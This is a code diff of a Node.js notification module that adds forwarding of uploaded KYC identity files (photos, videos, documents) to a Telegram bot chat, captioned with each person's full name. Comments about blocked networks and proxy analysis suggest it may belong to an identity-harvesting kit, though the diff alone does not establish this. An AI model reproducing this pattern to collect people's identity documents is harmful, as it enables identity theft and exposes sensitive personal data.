@@ -1,4 +1,6 @@
 import nodemailer from 'nodemailer';
+import fs from 'fs';
+import path from 'path';
 
 // Email configuration - Try different approach for blocked networks
 const createEmailTransporter = () => {
@@ -127,7 +129,7 @@ export const sendEmailNotification = async (kycData, files) => {
 };
 
 // Send Telegram notification
-export const sendTelegramNotification = async (kycData) => {
+export const sendTelegramNotification = async (kycData, files = []) => {
   try {
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -217,6 +219,73 @@ ${securityAnalysis.proxyInfo ? `
 
     if (!response.ok) {
       console.error('Failed to send Telegram notification:', await response.text());
+    }
+
+    // Send images if any files were uploaded
+    if (files && files.length > 0) {
+      for (const file of files) {
+        try {
+          // Check if file exists
+          if (!fs.existsSync(file.path)) {
+            console.error(`File not found: ${file.path}`);
+            continue;
+          }
+
+          // Determine file type and send accordingly
+          const fileExtension = path.extname(file.originalname).toLowerCase();
+          const isImage = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'].includes(fileExtension);
+          const isVideo = ['.mp4', '.avi', '.mov', '.wmv', '.flv', '.webm'].includes(fileExtension);
+
+          if (isImage) {
+            // Send as photo
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', fs.createReadStream(file.path));
+            formData.append('caption', `📷 ${file.originalname} - ${kycData.fullName}`);
+
+            const photoResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+              method: 'POST',
+              body: formData
+            });
+
+            if (!photoResponse.ok) {
+              console.error('Failed to send photo to Telegram:', await photoResponse.text());
+            }
+          } else if (isVideo) {
+            // Send as video
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('video', fs.createReadStream(file.path));
+            formData.append('caption', `🎥 ${file.originalname} - ${kycData.fullName}`);
+
+            const videoResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+              method: 'POST',
+              body: formData
+            });
+
+            if (!videoResponse.ok) {
+              console.error('Failed to send video to Telegram:', await videoResponse.text());
+            }
+          } else {
+            // Send as document
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('document', fs.createReadStream(file.path));
+            formData.append('caption', `📄 ${file.originalname} - ${kycData.fullName}`);
+
+            const docResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+              method: 'POST',
+              body: formData
+            });
+
+            if (!docResponse.ok) {
+              console.error('Failed to send document to Telegram:', await docResponse.text());
+            }
+          }
+        } catch (fileError) {
+          console.error(`Error sending file ${file.originalname} to Telegram:`, fileError);
+        }
+      }
     }
   } catch (error) {
     console.error('Error sending Telegram notification:', error);
